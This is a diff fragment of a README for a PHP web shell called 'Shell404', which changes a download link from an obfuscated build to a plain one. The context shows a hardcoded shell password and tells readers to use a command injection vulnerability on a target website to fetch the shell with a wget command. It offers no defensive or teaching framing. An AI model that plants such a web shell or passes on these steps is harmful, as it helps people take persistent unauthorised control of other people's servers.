@@ -37,7 +37,7 @@ $pass = "Shell404";
 If the target website has a **command injection vulnerability**, you can easily download the Shell404 web shell using the following command:
 
 ```bash
-wget https://raw.githubusercontent.com/Anon-404/Shell404/main/obf-Shell404.php
+wget https://raw.githubusercontent.com/Anon-404/Shell404/main/Shell404.php
 ```
 ### If have server security restriction
 
